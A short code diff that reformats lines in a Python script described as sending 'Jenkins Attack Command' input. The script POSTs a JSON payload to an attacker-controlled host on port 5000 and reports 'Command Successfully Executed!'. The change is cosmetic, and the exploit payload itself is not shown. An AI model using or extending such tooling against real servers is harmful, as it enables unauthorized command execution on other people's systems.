@@ -33,7 +33,8 @@ def main(cli: str) -> None:
     headers['Accept'] = '*/*'
 
     try:
-        resp = requests.post(f'http://{attacker}:5000/send', data=json.dumps(payload), headers=headers)
+        resp = requests.post(
+            f'http://{attacker}:5000/send', data=json.dumps(payload), headers=headers)
         if resp.status_code == 200:
             print('Command Successfully Executed!\n')
             print(resp.text)
@@ -50,7 +51,8 @@ def main(cli: str) -> None:
 if __name__ == '__main__':
     parser = argparse.ArgumentParser(description='Send Jenkins Attack Command')
     parser.add_argument('-c', '--cli', help='Attack Command', required=True)
-    parser.add_argument('-m', '--manual_cli', help='Manual Attack Command', required=False)
+    parser.add_argument('-m', '--manual_cli',
+                        help='Manual Attack Command', required=False)
 
     args = parser.parse_args()
     cli = args.cli
@@ -60,4 +62,3 @@ if __name__ == '__main__':
         main(mcli)
     else:
         main(cli)
-
